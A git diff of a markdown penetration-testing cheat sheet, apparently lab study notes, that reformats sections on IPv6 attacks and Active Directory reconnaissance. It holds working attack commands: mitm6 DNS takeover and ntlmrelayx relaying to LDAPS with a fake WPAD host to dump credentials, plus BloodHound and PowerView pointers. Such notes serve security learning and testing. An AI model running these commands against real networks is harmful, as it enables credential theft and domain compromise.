@@ -2223,20 +2223,24 @@ python3 /home/kali/.local/bin/ntlmrelayx.py -tf targets.txt -smb2support -i # Ga
 ```
 
 ## IPv6 Attack
-
-https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
 ```
+https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+
 sudo mitm6 -d marvel.local #Run mitm6 first to IPv6 server
 
 python3 /home/kali/.local/bin/ntlmrelayx.py -6 -t ldaps://192.168.68.122 -wh fakewpad.marvel.local -l lootme # Captures IPv6 request to capture & dump creds to lootme
+```
 
 ## AD Recon
 
+
 ### PowerView
+```
 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 # Cheat Sheet
+```
 
 ### Bloodhound
-
+```
 AzureHound for Azure Active Directory # Install-Module -name Az -AllowClobber | Install-Module -name AzureADPreview -AllowClobber
 
 SharpHound for local Active Directory # run the collector on the machine using SharpHound
